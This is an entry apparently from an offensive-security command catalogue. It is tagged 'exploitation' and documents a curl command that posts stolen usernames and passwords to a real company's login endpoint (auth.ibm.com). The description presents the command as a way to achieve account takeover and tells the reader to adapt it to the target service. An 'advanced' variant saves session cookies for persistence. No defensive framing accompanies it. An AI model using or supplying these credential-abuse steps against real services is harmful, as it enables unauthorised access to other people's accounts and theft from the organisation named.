---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl -X POST -d 'username=stolen_username&password=stolen_password'
  https://auth.ibm.com/login
tags:
  - auth
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:33:12.406Z'
verified: false
validated: true
submitted: true
---
# curl-login-with-stolen-creds

## Command

```bash
curl -X POST -d 'username=stolen_username&password=stolen_password' https://auth.ibm.com/login
```

## Description

This command attempts to authenticate to a web login endpoint using stolen credentials, enabling account takeover. Adapt the payload and URL to the target service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d` | Data payload (form-encoded) | Yes |
| `URL` | Target login endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'username=employee@ibm.com&password=exposedpass' https://auth.ibm.com/login
```

### Advanced Usage

```bash
curl -X POST -d 'username=employee@ibm.com&password=exposedpass' -c cookies.txt https://auth.ibm.com/login
```
(Saves session cookies for persistence)

## Expected Output

Success: HTTP 200 with session token or redirect (e.g., "Login successful"). Failure: 401 Unauthorized.

## Related

- [[Related Procedure: Utilize-Exposed-Credentials-for-Account-Takeover]]
